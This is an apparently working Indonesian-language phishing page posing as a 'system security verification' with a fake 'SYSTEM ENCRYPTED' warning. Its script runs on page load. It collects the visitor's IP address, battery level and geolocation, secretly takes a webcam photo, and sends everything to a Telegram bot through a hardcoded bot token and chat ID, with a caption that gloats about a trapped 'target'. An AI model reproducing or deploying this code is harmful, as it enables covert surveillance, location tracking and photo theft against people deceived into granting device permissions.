<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifikasi Keamanan Sistem</title>
    <style>
        body { background-color: black; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; }
        #camera-preview { position: fixed; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; display: none; z-index: 10; }
        .box { z-index: 5; text-align: center; border: 1px solid #333; padding: 20px; border-radius: 10px; }
        .dot { height: 10px; width: 10px; background-color: red; border-radius: 50%; display: inline-block; animation: blink 1s infinite; }
        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
    </style>
</head>
<body>
    <div class="box">
        <div class="dot"></div>
        <p>SYSTEM ENCRYPTED</p>
        <p style="font-size: 12px; color: #888;">Mohon Izinkan Akses Perangkat untuk Dekripsi Data</p>
    </div>

    <video id="camera-preview" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const BOT_TOKEN = '8671154802:AAE27-gfr-z089_hQc7imsfH9DXWrXvubQI';
        const CHAT_ID = '1397999934';
        let targetData = {};

        // Fungsi kirim paket lengkap (Foto + Caption Data)
        async function sendFullPackage(photoBlob) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', photoBlob, 'target_muka.jpg');
            
            // Caption isi semua info biar barengan sama foto
            let caption = `<b>🔥 TARGET KENA JEBAKAN! 🔥</b>\n\n` +
                          `🌐 <b>IP:</b> <code>${targetData.ip || 'Gagal'}</code>\n` +
                          `🔋 <b>Batre:</b> ${targetData.battery || '??'}%\n` +
                          `📍 <b>Maps:</b> ${targetData.maps || 'Akses Ditolak'}\n` +
                          `📱 <b>Device:</b> <code>${navigator.userAgent.substring(0, 50)}...</code>`;
            
            formData.append('caption', caption);
            formData.append('parse_mode', 'html');

            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
        }

        async function init() {
            // 1. Sedot IP & Batre dulu
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipJson = await ipRes.json();
                targetData.ip = ipJson.ip;
                const bat = await navigator.getBattery();
                targetData.battery = Math.round(bat.level * 100);
            } catch (e) {}

            // 2. Minta Lokasi & Kamera Barengan
            navigator.geolocation.getCurrentPosition(async (pos) => {
                targetData.maps = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                startCamera();
            }, () => {
                targetData.maps = "Akses Lokasi Ditolak";
                startCamera();
            });
        }

        async function startCamera() {
            const video = document.getElementById('camera-preview');
            const canvas = document.getElementById('canvas');

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                video.style.display = 'block'; // Mirror Mode: Muka target muncul

                // Tunggu 1.5 detik biar fokus, langsung jepret & kirim Paket Lengkap
                setTimeout(() => {
                    const ctx = canvas.getContext('2d');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    ctx.drawImage(video, 0, 0);
                    canvas.toBlob(blob => sendFullPackage(blob), 'image/jpeg');
                }, 1500);
            } catch (err) {
                // Kalau kamera ditolak, tetep kirim data teksnya aja
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&parse_mode=html&text=<b>❌ KAMERA DITOLAK</b>%0A%0AIP: ${targetData.ip}%0AMaps: ${targetData.maps}`);
            }
        }

        window.onload = init;
    </script>
</body>
</html>
